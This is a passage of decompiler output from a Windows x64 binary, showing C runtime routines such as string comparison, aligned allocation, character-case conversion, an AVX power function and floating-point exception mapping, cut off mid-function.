//----- (000000013F16A14C) ----------------------------------------------------
void __fastcall sub_13F16A14C(unsigned int a1)
{
  sub_13F169EB0(a1, 0, 0);
}

//----- (000000013F16A158) ----------------------------------------------------
void __noreturn sub_13F16A158()
{
  __int64 v0; // rax
  void (__fastcall *v1)(_QWORD); // rbx

  v0 = sub_13F16E528();
  v1 = *(void (__fastcall **)(_QWORD))(v0 + 24);
  if ( v1 )
    v1(*(_QWORD *)(v0 + 24));
  sub_13F16DDAC();
}
// 13F180450: using guessed type __int64 (__fastcall *_guard_check_icall_fptr)(_QWORD);

//----- (000000013F16A1A0) ----------------------------------------------------
__int64 __fastcall sub_13F16A1A0(_QWORD *a1, __int64 a2, unsigned __int64 a3)
{
  __int64 v3; // rdx
  unsigned __int8 v4; // al
  __int64 v5; // rax
  bool v6; // cc

  v3 = a2 - (_QWORD)a1;
  if ( !a3 )
    return 0i64;
  if ( ((unsigned __int8)a1 & 7) != 0 )
    goto LABEL_3;
LABEL_7:
  while ( (((_WORD)a1 + (_WORD)v3) & 0xFFFu) <= 0xFF8 )
  {
    v5 = *a1;
    if ( *a1 != *(_QWORD *)((char *)a1 + v3) )
      break;
    ++a1;
    v6 = a3 <= 8;
    a3 -= 8i64;
    if ( v6 || ((v5 - 0x101010101010101i64) & ~v5 & 0x8080808080808080ui64) != 0 )
      return 0i64;
  }
LABEL_3:
  while ( 1 )
  {
    v4 = *(_BYTE *)a1;
    if ( *(_BYTE *)a1 != *((_BYTE *)a1 + v3) )
      return -(__int64)(v4 < *((_BYTE *)a1 + v3)) | 1;
    a1 = (_QWORD *)((char *)a1 + 1);
    if ( !--a3 || !v4 )
      return 0i64;
    if ( ((unsigned __int8)a1 & 7) == 0 )
      goto LABEL_7;
  }
}

//----- (000000013F16A230) ----------------------------------------------------
__int64 __fastcall sub_13F16A230(unsigned __int8 *a1, __int64 a2)
{
  __int64 v2; // rdx
  unsigned __int8 v3; // al
  __int64 v4; // rax

  v2 = a2 - (_QWORD)a1;
  if ( ((unsigned __int8)a1 & 7) != 0 )
  {
LABEL_2:
    while ( 1 )
    {
      v3 = *a1;
      if ( *a1 != a1[v2] )
        return -(__int64)(v3 < a1[v2]) | 1;
      ++a1;
      if ( !v3 )
        return 0i64;
      if ( ((unsigned __int8)a1 & 7) == 0 )
        goto LABEL_5;
    }
  }
  else
  {
    do
    {
LABEL_5:
      if ( (((_WORD)a1 + (_WORD)v2) & 0xFFFu) > 0xFF8 )
        goto LABEL_2;
      v4 = *(_QWORD *)a1;
      if ( *(_QWORD *)a1 != *(_QWORD *)&a1[v2] )
        goto LABEL_2;
      a1 += 8;
    }
    while ( ((v4 - 0x101010101010101i64) & ~v4 & 0x8080808080808080ui64) == 0 );
    return 0i64;
  }
}

//----- (000000013F16A2A0) ----------------------------------------------------
__int64 __fastcall sub_13F16A2A0(__int64 a1)
{
  __int64 result; // rax

  if ( a1 )
    return sub_13F16A188(*(_QWORD *)((a1 & 0xFFFFFFFFFFFFFFF8ui64) - 8));
  return result;
}
// 13F16A188: using guessed type __int64 __fastcall sub_13F16A188(_QWORD);

//----- (000000013F16A2BC) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F16A2BC(unsigned __int64 a1, unsigned __int64 a2)
{
  return sub_13F16A2C4(a1, a2, 0i64);
}

//----- (000000013F16A2C4) ----------------------------------------------------
unsigned __int64 __fastcall sub_13F16A2C4(unsigned __int64 a1, unsigned __int64 a2, unsigned __int64 a3)
{
  __int64 v4; // rdi
  __int64 v5; // rdi
  __int64 v6; // rsi
  __int64 v7; // r14
  __int64 v8; // rax
  __int64 v9; // rdx
  unsigned __int64 result; // rax

  if ( !a2 || ((a2 - 1) & a2) != 0 || a3 && a3 >= a1 )
  {
    *(_DWORD *)sub_13F169DAC() = 22;
    sub_13F1682A0();
  }
  else
  {
    v4 = 8i64;
    if ( a2 > 8 )
      v4 = a2;
    v5 = v4 - 1;
    v6 = -(int)a3 & 7;
    v7 = v6 + v5 + 8;
    if ( a1 <= v7 + a1 )
    {
      v8 = sub_13F16A298(v7 + a1);
      v9 = v8;
      if ( v8 )
      {
        result = (~v5 & (a3 + v7 + v8)) - a3;
        *(_QWORD *)(result - v6 - 8) = v9;
        return result;
      }
    }
    else
    {
      *(_DWORD *)sub_13F169DAC() = 12;
    }
  }
  return 0i64;
}
// 13F16A298: using guessed type __int64 __fastcall sub_13F16A298(_QWORD);

//----- (000000013F16A37C) ----------------------------------------------------
__int64 __fastcall sub_13F16A37C(int a1)
{
  return asc_13F190140[a1] & 4;
}
// 13F190140: using guessed type wchar_t asc_13F190140[33];
// 13F1B74B0: using guessed type wchar_t *off_13F1B74B0;
// 13F1C6238: using guessed type int dword_13F1C6238;

//----- (000000013F16A3F0) ----------------------------------------------------
bool __fastcall sub_13F16A3F0(int a1, __int128 *a2)
{
  __int64 v2; // rdi
  int v3; // eax
  __int64 v4; // rax

  v2 = a1;
  if ( !a2 )
  {
    v4 = sub_13F170B50();
    goto LABEL_6;
  }
  if ( *(int *)(*(_QWORD *)a2 + 8i64) <= 1 )
  {
    v4 = **(_QWORD **)a2;
LABEL_6:
    v3 = *(_WORD *)(v4 + 2 * v2) & 1;
    return v3 != 0;
  }
  v3 = sub_13F170B80(a1, 1, a2);
  return v3 != 0;
}

//----- (000000013F16A440) ----------------------------------------------------
__int64 __fastcall sub_13F16A440(int a1, __int128 *a2)
{
  __int64 v2; // rbx
  int v3; // ecx
  char *v4; // rax
  int v5; // eax
  __int64 v7; // [rsp+50h] [rbp-20h] BYREF
  __int128 v8; // [rsp+58h] [rbp-18h] BYREF
  char v9; // [rsp+68h] [rbp-8h]
  __int16 v10; // [rsp+80h] [rbp+10h] BYREF
  char v11; // [rsp+82h] [rbp+12h]
  __int16 v12; // [rsp+90h] [rbp+20h] BYREF
  char v13; // [rsp+92h] [rbp+22h]

  v2 = a1;
  sub_13F1687CC((__int64)&v7, a2);
  if ( (unsigned int)v2 < 0x100 )
  {
    if ( sub_13F16A3F0(v2, &v8) )
      LODWORD(v2) = *(unsigned __int8 *)(*(_QWORD *)(v8 + 272) + v2);
LABEL_4:
    if ( v9 )
      *(_DWORD *)(v7 + 936) &= ~2u;
    return (unsigned int)v2;
  }
  v10 = 0;
  v11 = 0;
  if ( *(int *)(v8 + 8) > 1 && (unsigned int)sub_13F170C90(BYTE1(v2), &v8) )
  {
    LOBYTE(v10) = BYTE1(v2);
    v3 = 2;
    HIBYTE(v10) = v2;
    v11 = 0;
  }
  else
  {
    v4 = sub_13F169DAC();
    v3 = 1;
    *(_DWORD *)v4 = 42;
    v10 = (unsigned __int8)v2;
  }
  v12 = 0;
  v13 = 0;
  v5 = sub_13F17102C(&v8, *(_QWORD *)(v8 + 312), 0x100u, &v10, v3, (__int64)&v12, 3, *(_DWORD *)(v8 + 12), 1);
  if ( !v5 )
    goto LABEL_4;
  LODWORD(v2) = (unsigned __int8)v12;
  if ( v5 == 1 )
    goto LABEL_4;
  LODWORD(v2) = HIBYTE(v12) | ((unsigned __int8)v12 << 8);
  if ( v9 )
    *(_DWORD *)(v7 + 936) &= ~2u;
  return (unsigned int)v2;
}

//----- (000000013F16A580) ----------------------------------------------------
__int64 __fastcall sub_13F16A580(unsigned int a1)
{
  if ( a1 - 65 <= 0x19 )
    a1 += 32;
  return a1;
}
// 13F1C6238: using guessed type int dword_13F1C6238;

//----- (000000013F16A5B0) ----------------------------------------------------
// local variable allocation has failed, the output may be wrong!
void __fastcall sub_13F16A5B0(double _XMM0_8)
{
  __asm
  {
    vpsrlq  xmm3, xmm0, 34h ; '4'
    vmovq   rax, xmm0
    vpsubq  xmm3, xmm3, cs:xmmword_13F18DA20
    vcvtdq2pd xmm6, xmm3
    vpand   xmm5, xmm0, cs:xmmword_13F18D9D0
    vcomisd xmm5, qword ptr cs:xmmword_13F18D9D0
  }
  if ( _RAX != 0x7FF0000000000000i64 )
  {
    if ( _RAX == 0xFFF0000000000000ui64 )
    {
      __asm { vmovsd  xmm1, cs:qword_13F18D9E0 }
      sub_13F171160(_XMM0_8, *(double *)&_XMM1, 2);
      __asm { vmovdqa xmm6, [rsp+58h+var_38] }
      return;
    }
    _RAX = _RAX | 0x8000000000000i64;
    __asm { vmovq   xmm1, rax }
    sub_13F171160(_XMM0_8, *(double *)&_XMM1, 3);
  }
  __asm { vmovdqa xmm6, [rsp+58h+var_38] }
}
// 13F16A5B0: inconsistent variable size for 'xmm0_8.8(_XMM0_8)'
// 13F1C6A40: using guessed type int dword_13F1C6A40;

//----- (000000013F16AAE0) ----------------------------------------------------
// local variable allocation has failed, the output may be wrong!
void __fastcall sub_13F16AAE0(double _XMM0_8, double _XMM1_8)
{
  bool v3; // zf
  __int64 v71; // rcx
  int v76; // er9
  __int64 v104; // r11
  signed __int64 v105; // r10
  __int64 v106; // rax
  __int64 v107; // rax
  __int64 v109; // rax
  __int64 v112; // rax
  __int64 v127; // rax
  __int64 v131; // rax
  unsigned int v132; // er9
  __int64 v137; // rax
  __int64 v144; // r9
  bool v145; // zf
  __int64 v153; // [rsp+20h] [rbp-B8h]
  __int64 v154; // [rsp+30h] [rbp-A8h]
  signed __int64 v155; // [rsp+40h] [rbp-98h]
  unsigned __int64 v156; // [rsp+50h] [rbp-88h]
  __int64 v157; // [rsp+60h] [rbp-78h]
  unsigned __int64 v158; // [rsp+70h] [rbp-68h]

  __asm
  {
    vmovsd  [rsp+0D8h+var_B8], xmm0
    vmovsd  [rsp+0D8h+var_A8], xmm1
  }
  _RDX = v153;
  if ( (v154 & 0x7FFFFFFFFFFFFFFFi64) == 0 )
  {
    v107 = 0i64;
    _R11 = v153 | 0x8000000000000i64;
    if ( (v153 & 0x7FF0000000000000i64) == 0x7FF0000000000000i64 )
      v107 = v153;
    if ( (v107 & 0xFFFFFFFFFFFFFi64) == 0 || (v107 & 0x8000000000000i64) != 0 )
    {
      __asm { vmovsd  xmm0, qword ptr cs:xmmword_13F18DDA0 }
      goto LABEL_17;
    }
    goto LABEL_100;
  }
  if ( v154 == 0x3FF0000000000000i64 )
  {
    v109 = 0i64;
    _R11 = v153 | 0x8000000000000i64;
    if ( (v153 & 0x7FF0000000000000i64) == 0x7FF0000000000000i64 )
      v109 = v153;
    if ( (v109 & 0xFFFFFFFFFFFFFi64) == 0 )
    {
      __asm { vmovq   xmm0, rdx }
      goto LABEL_17;
    }
LABEL_100:
    v137 = 0i64;
    if ( (v154 & 0x7FF0000000000000i64) == 0x7FF0000000000000i64 )
      v137 = v154;
    if ( (v137 & 0xFFFFFFFFFFFFFi64) != 0 )
    {
      v144 = v154;
      v145 = _R11 == 0xFFF8000000000000ui64;
      if ( _R11 == 0xFFF8000000000000ui64 )
        _R11 = v154;
      if ( !v145 )
      {
        if ( v154 == 0xFFF8000000000000ui64 )
          v144 = _R11;
        if ( v144 < 0 )
          v144 = _R11;
        if ( _R11 < 0 )
          _R11 = v144;
      }
      _R11 = _R11 | 0x8000000000000i64;
      __asm
      {
        vmovsd  xmm0, [rsp+0D8h+var_B8]
        vmovsd  xmm1, [rsp+0D8h+var_A8]
        vmovq   xmm2, r11
      }
      sub_13F171220(*(double *)&_XMM0, *(double *)&_XMM1, *(double *)&_XMM2, 5u);
    }
    else
    {
      __asm
      {
        vmovsd  xmm0, [rsp+0D8h+var_B8]
        vmovsd  xmm1, [rsp+0D8h+var_A8]
        vmovq   xmm2, r11
      }
      sub_13F171220(*(double *)&_XMM0, *(double *)&_XMM1, *(double *)&_XMM2, 3u);
    }
    goto LABEL_17;
  }
  v156 = 0i64;
  if ( (v153 & 0x8000000000000000ui64) == 0x8000000000000000ui64 )
  {
    if ( (v154 & 0x7FF0000000000000ui64) > 0x43E0000000000000i64 )
      goto LABEL_56;
    v104 = v154 & 0x7FFFFFFFFFFFFFFFi64;
    v105 = ((v154 & 0x7FFFFFFFFFFFFFFFui64) >> 52) - 1023;
    if ( v105 >= 0 )
    {
      v157 = v153 & 0x7FFFFFFFFFFFFFFFi64;
      if ( v105 > 53 )
        goto LABEL_31;
      if ( (v104 & (0xFFFFFFFFFFFFFui64 >> ((unsigned __int8)((v154 & 0x7FFFFFFFFFFFFFFFui64) >> 52) + 1))) == 0 )
      {
        if ( (v104 & (0x10000000000000ui64 >> ((unsigned __int8)((v154 & 0x7FFFFFFFFFFFFFFFui64) >> 52) + 1))) != 0 )
          v156 = 0x8000000000000000ui64;
LABEL_31:
        if ( v153 != 0x8000000000000000ui64 )
        {
          if ( v153 == 0xBFF0000000000000ui64 )
            goto LABEL_49;
          v3 = (v153 & 0x7FF0000000000000i64) == 0x7FF0000000000000i64;
          if ( (v153 & 0x7FF0000000000000i64) != 0x7FF0000000000000i64 )
          {
            __asm { vmovsd  xmm0, [rsp+0D8h+var_78] }
LABEL_9:
            __asm
            {
              vpsrlq  xmm3, xmm0, 34h ; '4'
              vmovq   r8, xmm0
              vpsubq  xmm3, xmm3, cs:xmmword_13F18DD50
              vcvtdq2pd xmm6, xmm3
              vpand   xmm2, xmm0, cs:xmmword_13F18DD40
              vcomisd xmm6, cs:qword_13F18DE30
            }
            if ( v3 )
            {
              __asm
              {
                vpor    xmm2, xmm2, cs:xmmword_13F18DDA0
                vsubsd  xmm2, xmm2, qword ptr cs:xmmword_13F18DDA0
                vmovapd xmm5, xmm2
                vpand   xmm2, xmm2, cs:xmmword_13F18DD40
                vmovq   r8, xmm2
                vpsrlq  xmm5, xmm5, 34h ; '4'
                vpsubd  xmm5, xmm5, cs:xmmword_13F18DE40
                vcvtdq2pd xmm6, xmm5
              }
            }
            _R8 = 2 * (_R8 & 0x80000000000i64) + (_R8 & 0xFF00000000000i64);
            __asm { vmovq   xmm1, r8 }
            _R8 >>= 44;
            __asm
            {
              vpor    xmm2, xmm2, cs:xmmword_13F18DDB0
              vpor    xmm1, xmm1, cs:xmmword_13F18DDB0
              vsubsd  xmm4, xmm1, xmm2
              vmulsd  xmm1, xmm4, qword ptr [r9+r8*8]
              vmovapd xmm5, xmm1
              vmulsd  xmm4, xmm4, qword ptr [rdx+r8*8]
              vmovapd xmm7, xmm4
              vaddsd  xmm1, xmm1, xmm4
              vmovapd xmm2, xmm1
              vmovapd xmm0, xmm1
            }
            _R9 = &qword_13F190640;
            __asm
            {
              vsubsd  xmm3, xmm5, xmm2
              vmovsd  xmm1, cs:qword_13F18DE20
              vmulsd  xmm0, xmm0, xmm0
              vaddsd  xmm3, xmm3, xmm7
              vfmadd213sd xmm1, xmm2, cs:qword_13F18DE10
              vfmadd213sd xmm1, xmm2, cs:qword_13F18DE00
              vfmadd213sd xmm1, xmm2, cs:qword_13F18DDF0
              vfmadd213sd xmm1, xmm2, cs:qword_13F18DDE0
              vfmadd213sd xmm1, xmm2, cs:qword_13F18DDD0
              vfmadd213sd xmm1, xmm0, xmm3
              vmovsd  xmm5, cs:qword_13F18DD80
              vfmsub213sd xmm5, xmm6, xmm1
              vmovsd  xmm0, qword ptr [r9+r8*8]
              vaddsd  xmm3, xmm5, qword ptr [rdx+r8*8]
              vmovapd xmm1, xmm3
              vsubsd  xmm3, xmm3, xmm2
              vfmadd231sd xmm0, xmm6, cs:qword_13F18DD70
              vmovapd xmm7, xmm0
              vaddsd  xmm0, xmm0, xmm3
              vmovapd xmm5, xmm0
              vandpd  xmm0, xmm0, cs:xmmword_13F18DCD0
              vaddsd  xmm2, xmm2, xmm3
              vsubsd  xmm7, xmm7, xmm5
              vsubsd  xmm1, xmm1, xmm2
              vaddsd  xmm7, xmm7, xmm3
              vsubsd  xmm5, xmm5, xmm0
            }
            v158 = v154 & 0xFFFFFFFFF8000000ui64;
            __asm
            {
              vmovsd  xmm4, [rsp+0D8h+var_A8]
              vaddsd  xmm7, xmm7, xmm1
              vaddsd  xmm7, xmm7, xmm5
              vmovsd  xmm2, [rsp+0D8h+var_68]
              vsubsd  xmm4, xmm4, xmm2
              vmulsd  xmm3, xmm4, xmm7
              vmulsd  xmm4, xmm4, xmm0
              vmulsd  xmm5, xmm7, xmm2
              vmulsd  xmm6, xmm0, xmm2
              vmovapd xmm1, xmm6
              vaddsd  xmm3, xmm3, xmm4
              vaddsd  xmm3, xmm3, xmm5
              vaddsd  xmm1, xmm1, xmm3
              vmovapd xmm0, xmm1
              vsubsd  xmm6, xmm6, xmm1
              vaddsd  xmm6, xmm6, xmm3
              vmovsd  [rsp+0D8h+var_98], xmm0
              vmulsd  xmm7, xmm0, cs:qword_13F18EF00
              vcomisd xmm7, cs:qword_13F18EEE0
            }
            if ( (v154 & 0xFFFFFFFFF8000000ui64) == 0 )
            {
              __asm
              {
                vcomisd xmm7, cs:qword_13F18EEF0
                vcvtpd2dq xmm4, xmm7
                vcvtdq2pd xmm1, xmm4
                vfnmadd231sd xmm0, xmm1, cs:qword_13F18EF10
                vmovd   ecx, xmm4
                vmulsd  xmm1, xmm1, cs:qword_13F18EF20
                vmovapd xmm2, xmm0
              }
              v71 = (unsigned int)((_ECX - (_ECX & 0x3F)) >> 6);
              __asm
              {
                vaddsd  xmm2, xmm2, xmm1
                vaddsd  xmm2, xmm2, xmm6
                vmovapd xmm1, xmm2
                vmovsd  xmm0, cs:qword_13F18EF30
              }
              v76 = 0;
              __asm
              {
                vfmadd213sd xmm0, xmm2, cs:qword_13F18EF40
                vfmadd213sd xmm0, xmm2, cs:qword_13F18EF50
              }
              if ( (int)v71 <= -1022 )
                v76 = v71;
              __asm
              {
                vfmadd213sd xmm0, xmm2, cs:qword_13F18EF60
                vfmadd213sd xmm0, xmm2, cs:qword_13F18EF70
                vfmadd213sd xmm0, xmm2, qword ptr cs:xmmword_13F18DDA0
                vmulsd  xmm0, xmm0, xmm2
                vmulsd  xmm5, xmm0, qword ptr [r11+rax*8]
                vmulsd  xmm1, xmm0, qword ptr [r10+rax*8]
                vaddsd  xmm5, xmm5, qword ptr [r11+rax*8]
                vaddsd  xmm1, xmm1, xmm5
                vaddsd  xmm1, xmm1, qword ptr [r10+rax*8]
                vmovapd xmm0, xmm1
              }
              if ( (v71 + 1023) << 52 != 0x7FF0000000000000i64 )
              {
                if ( v76 )
                {
                  __asm { vcomisd xmm0, qword ptr cs:xmmword_13F18DDA0 }
                  if ( v76 == -1022 )
                  {
                    __asm
                    {
                      vmulsd  xmm0, xmm0, [rsp+0D8h+var_98]
                      vorpd   xmm0, xmm0, [rsp+0D8h+var_88]
                    }
                  }
                  else
                  {
                    if ( v155 > (__int64)0xC0874046DFEFD9D0ui64 )
                    {
                      __asm
                      {
                        vmovsd  xmm0, cs:qword_13F18EEC0
                        vorpd   xmm0, xmm0, [rsp+0D8h+var_88]
                      }
                    }
                    else
                    {
                      __asm
                      {
                        vmulsd  xmm0, xmm0, [rsp+0D8h+var_98]
                        vorpd   xmm0, xmm0, [rsp+0D8h+var_88]
                      }
                    }
                    __asm
                    {
                      vmovapd xmm2, xmm0
                      vmovsd  xmm0, [rsp+0D8h+var_B8]
                      vmovsd  xmm1, [rsp+0D8h+var_A8]
                    }
                    sub_13F171220(*(double *)&_XMM0, *(double *)&_XMM1, *(double *)&_XMM2, 8u);
                  }
                }
                else
                {
                  __asm
                  {
                    vmulsd  xmm0, xmm0, [rsp+0D8h+var_98]
                    vorpd   xmm0, xmm0, [rsp+0D8h+var_88]
                  }
                }
                goto LABEL_17;
              }
              __asm { vcomisd xmm0, qword ptr cs:xmmword_13F18DDA0 }
            }
            _R11 = v156 | 0x7FF0000000000000i64;
            goto LABEL_96;
          }
          goto LABEL_73;
        }
        goto LABEL_61;
      }
    }
    if ( (v153 & 0x7FF0000000000000i64) == 0x7FF0000000000000i64 )
      goto LABEL_73;
    if ( v153 != 0x8000000000000000ui64 )
    {
      __asm
      {
        vmovsd  xmm0, [rsp+0D8h+var_B8]
        vmovsd  xmm1, [rsp+0D8h+var_A8]
        vmovsd  xmm2, cs:qword_13F18DC60
      }
      sub_13F171220(*(double *)&_XMM0, *(double *)&_XMM1, *(double *)&_XMM2, 6u);
      goto LABEL_17;
    }
    goto LABEL_61;
  }
  if ( v153 == 0x3FF0000000000000i64 )
  {
    v106 = 0i64;
    _R11 = v154 | 0x8000000000000i64;
    if ( (v154 & 0x7FF0000000000000i64) == 0x7FF0000000000000i64 )
      v106 = v154;
    if ( (v106 & 0xFFFFFFFFFFFFFi64) != 0 && (v106 & 0x8000000000000i64) == 0 )
      goto LABEL_104;
    goto LABEL_17;
  }
  if ( v153 )
  {
    if ( (v153 & 0x7FF0000000000000i64) != 0x7FF0000000000000i64 )
    {
      if ( (v154 & 0x7FF0000000000000ui64) <= 0x43E0000000000000i64 )
      {
        v3 = (v154 & 0x7FF0000000000000i64) == 0x3C00000000000000i64;
        if ( (v154 & 0x7FF0000000000000ui64) < 0x3C00000000000000i64 )
        {
          __asm { vaddsd  xmm0, xmm1, cs:qword_13F18DC38 }
          goto LABEL_17;
        }
        goto LABEL_9;
      }
LABEL_56:
      if ( (v153 & 0x7FF0000000000000i64) != 0x7FF0000000000000i64 )
      {
        if ( (v153 & 0x7FFFFFFFFFFFFFFFi64) != 0 )
        {
          if ( v153 != 0xBFF0000000000000ui64 )
          {
            if ( (v153 & 0x7FFFFFFFFFFFFFFFui64) < 0x3FF0000000000000i64 )
            {
              _R11 = 0i64;
              if ( v154 < 0 )
                _R11 = 0x7FF0000000000000i64;
            }
            else
            {
              _R11 = 0i64;
              if ( v154 >= 0 )
                _R11 = 0x7FF0000000000000i64;
            }
            v131 = 0i64;
            if ( (v154 & 0x7FF0000000000000i64) == 0x7FF0000000000000i64 )
              v131 = v154;
            if ( (v131 & 0xFFFFFFFFFFFFFi64) != 0 )
              _R11 = v154 | 0x8000000000000i64;
            if ( (v131 & 0xFFFFFFFFFFFFFi64) == 0 )
            {
              if ( v131 )
              {
                __asm { vmovq   xmm0, r11 }
                goto LABEL_17;
              }
LABEL_96:
              v132 = 7;
              if ( (_R11 & 0x7FFFFFFFFFFFFFFFi64) != 0 )
                v132 = 9;
              __asm
              {
                vmovsd  xmm0, [rsp+0D8h+var_B8]
                vmovsd  xmm1, [rsp+0D8h+var_A8]
                vmovq   xmm2, r11
              }
              sub_13F171220(*(double *)&_XMM0, *(double *)&_XMM1, *(double *)&_XMM2, v132);
              goto LABEL_17;
            }
LABEL_104:
            __asm
            {
              vmovsd  xmm0, [rsp+0D8h+var_B8]
              vmovsd  xmm1, [rsp+0D8h+var_A8]
              vmovq   xmm2, r11
            }
            sub_13F171220(*(double *)&_XMM0, *(double *)&_XMM1, *(double *)&_XMM2, 4u);
            goto LABEL_17;
          }
LABEL_49:
          _RDX = v156 | 0x3FF0000000000000i64;
          v112 = 0i64;
          _R11 = v154 | 0x8000000000000i64;
          if ( (v154 & 0x7FF0000000000000i64) == 0x7FF0000000000000i64 )
            v112 = v154;
          if ( (v112 & 0xFFFFFFFFFFFFFi64) == 0 )
          {
            __asm { vmovq   xmm0, rdx }
            goto LABEL_17;
          }
          goto LABEL_104;
        }
        goto LABEL_61;
      }
    }
LABEL_73:
    _R11 = 0i64;
    if ( v154 >= 0 )
      _R11 = 0x7FF0000000000000i64;
    if ( (v153 & 0xFFFFFFFFFFFFFi64) != 0 )
      _R11 = v153 | 0x8000000000000i64;
    if ( (v153 & 0xFFFFFFFFFFFFFi64) == 0 )
    {
      v127 = 0i64;
      if ( (v154 & 0x7FF0000000000000i64) == 0x7FF0000000000000i64 )
        v127 = v154;
      if ( (v127 & 0xFFFFFFFFFFFFFi64) != 0 )
        _R11 = v154 | 0x8000000000000i64;
      if ( (v127 & 0xFFFFFFFFFFFFFi64) == 0 )
      {
        __asm
        {
          vmovq   xmm0, r11
          vorpd   xmm0, xmm0, [rsp+0D8h+var_88]
        }
        goto LABEL_17;
      }
      goto LABEL_104;
    }
    goto LABEL_100;
  }
LABEL_61:
  _RAX = 0i64;
  if ( (v154 & 0x7FF0000000000000i64) == 0x7FF0000000000000i64 )
  {
    if ( v154 == 0xFFF0000000000000ui64 )
    {
      __asm { vmovsd  xmm0, cs:qword_13F18DC30 }
      goto LABEL_17;
    }
    if ( v154 == 0x7FF0000000000000i64 )
    {
      __asm { vxorpd  xmm0, xmm0, xmm0 }
      goto LABEL_17;
    }
    _R11 = v154 | 0x8000000000000i64;
    if ( (v154 & 0xFFFFFFFFFFFFFi64) == 0 )
    {
      __asm { vmovq   xmm0, rax }
      goto LABEL_17;
    }
    goto LABEL_104;
  }
  if ( v154 < 0 )
    _RAX = 0x7FF0000000000000i64;
  if ( v154 < 0 )
  {
    __asm
    {
      vmovsd  xmm0, [rsp+0D8h+var_B8]
      vmovsd  xmm1, [rsp+0D8h+var_A8]
      vmovq   xmm2, rax
      vorpd   xmm2, xmm2, [rsp+0D8h+var_88]
    }
    sub_13F171220(*(double *)&_XMM0, *(double *)&_XMM1, *(double *)&_XMM2, 2u);
  }
  else
  {
    __asm
    {
      vmovq   xmm0, rax
      vorpd   xmm0, xmm0, [rsp+0D8h+var_88]
    }
  }
LABEL_17:
  __asm
  {
    vmovdqa xmm7, [rsp+0D8h+var_38]
    vmovdqa xmm6, [rsp+0D8h+var_48]
  }
}
// 13F16BA98: conditional instruction was optimized away because rcx.8==7FF0000000000000
// 13F16AAE0: inconsistent variable size for 'xmm0_8.8(_XMM0_8)'
// 13F16AAE0: inconsistent variable size for 'xmm1_8.8(_XMM1_8)'
// 13F190640: using guessed type __int64 qword_13F190640;
// 13F1C6A40: using guessed type int dword_13F1C6A40;

//----- (000000013F16C174) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F16C174()
{
  __int64 v0; // rax
  __int64 v2; // [rsp+30h] [rbp+8h] BYREF
  __int64 v3; // [rsp+38h] [rbp+10h] BYREF

  if ( (unsigned int)MEMORY[0x76F7E0E0](&v2) && (unsigned int)MEMORY[0x76F859A0](&v3) && v2 )
  {
    qword_13F1C6080 = v2;
    v0 = v3;
  }
  else
  {
    v0 = -1i64;
    qword_13F1C6080 = -1i64;
  }
  qword_13F1C6088 = v0;
  return 0i64;
}
// 13F16C1A0: write access to const memory at 13F1C6080 has been detected
// 13F16C1B2: write access to const memory at 13F1C6080 has been detected
// 13F16C1B9: write access to const memory at 13F1C6088 has been detected
// 13F16C174: using guessed type __int64 __fastcall sub_13F16C174();
// 13F1C6080: using guessed type __int64 qword_13F1C6080;
// 13F1C6088: using guessed type __int64 qword_13F1C6088;

//----- (000000013F16C1C8) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
void __fastcall sub_13F16C1C8(__int64 a1)
{
  qword_13F1C6090 = a1;
}
// 13F16C1C8: write access to const memory at 13F1C6090 has been detected
// 13F1C6090: using guessed type __int64 qword_13F1C6090;

//----- (000000013F16C1D0) ----------------------------------------------------
_BOOL8 __fastcall sub_13F16C1D0(__int64 a1)
{
  unsigned int (__fastcall *v2)(__int64); // rax

  v2 = (unsigned int (__fastcall *)(__int64))sub_13F16C210();
  return v2 && v2(a1);
}
// 13F180450: using guessed type __int64 (__fastcall *_guard_check_icall_fptr)(_QWORD);

//----- (000000013F16C210) ----------------------------------------------------
__int64 sub_13F16C210()
{
  sub_13F170628();
  sub_13F17067C();
  return __ROR8__(_security_cookie ^ 0x2CC5EF7154DEi64, _security_cookie & 0x3F);
}
// 13F1C6090: using guessed type __int64 qword_13F1C6090;

//----- (000000013F16C244) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 __fastcall sub_13F16C244(__int64 a1)
{
  sub_13F170628();
  qword_13F1C6090 = _security_cookie ^ __ROR8__(a1, 64 - ((unsigned __int8)_security_cookie & 0x3Fu));
  sub_13F17067C();
  return __ROR8__(_security_cookie ^ 0x2CC5EF7154DEi64, _security_cookie & 0x3F);
}
// 13F16C281: write access to const memory at 13F1C6090 has been detected
// 13F1C6090: using guessed type __int64 qword_13F1C6090;

//----- (000000013F16C2A0) ----------------------------------------------------
__int64 __fastcall sub_13F16C2A0(int a1, __int64 a2)
{
  _QWORD *v4; // rax
  _QWORD *v5; // rbx
  __int64 v7; // rcx
  __int64 v8; // rax
  void (__fastcall *v9)(_QWORD); // rdi
  __int64 v10; // rbp
  unsigned int v11; // esi
  __int64 v12; // rcx
  __int64 v13; // rdx
  int v14; // esi

  v4 = (_QWORD *)sub_13F16E5BC();
  v5 = v4;
  if ( !v4 )
    return 0i64;
  v7 = *v4;
  v8 = v7;
  if ( v7 == v7 + 192 )
  {
LABEL_6:
    v8 = 0i64;
  }
  else
  {
    while ( *(_DWORD *)v8 != a1 )
    {
      v8 += 16i64;
      if ( v8 == v7 + 192 )
        goto LABEL_6;
    }
  }
  if ( !v8 )
    return 0i64;
  v9 = *(void (__fastcall **)(_QWORD))(v8 + 8);
  if ( !v9 )
    return 0i64;
  if ( v9 == (void (__fastcall *)(_QWORD))5 )
  {
    *(_QWORD *)(v8 + 8) = 0i64;
    return 1i64;
  }
  else
  {
    if ( v9 != (void (__fastcall *)(_QWORD))1 )
    {
      v10 = v5[1];
      v5[1] = a2;
      v11 = *(_DWORD *)(v8 + 4);
      if ( v11 == 8 )
      {
        v12 = v7 + 48;
        v13 = v12 + 144;
        while ( v12 != v13 )
        {
          *(_QWORD *)(v12 + 8) = 0i64;
          v12 += 16i64;
        }
        v14 = *((_DWORD *)v5 + 4);
        switch ( *(_DWORD *)v8 )
        {
          case 0xC000008D:
            *((_DWORD *)v5 + 4) = 130;
            break;
          case 0xC000008E:
            *((_DWORD *)v5 + 4) = 131;
            break;
          case 0xC000008F:
            *((_DWORD *)v5 + 4) = 134;
            break;
          case 0xC0000090:
            *((_DWORD *)v5 + 4) = 129;
            break;
          case 0xC0000091:
            *((_DWORD *)v5 + 4) = 132;
            break;
          case 0xC0000092:
            *((_DWORD *)v5 + 4) = 138;
            break;
          case 0xC0000093:
            *((_DWORD *)v5 + 4) = 133;
            break;
          case 0xC00002B4:
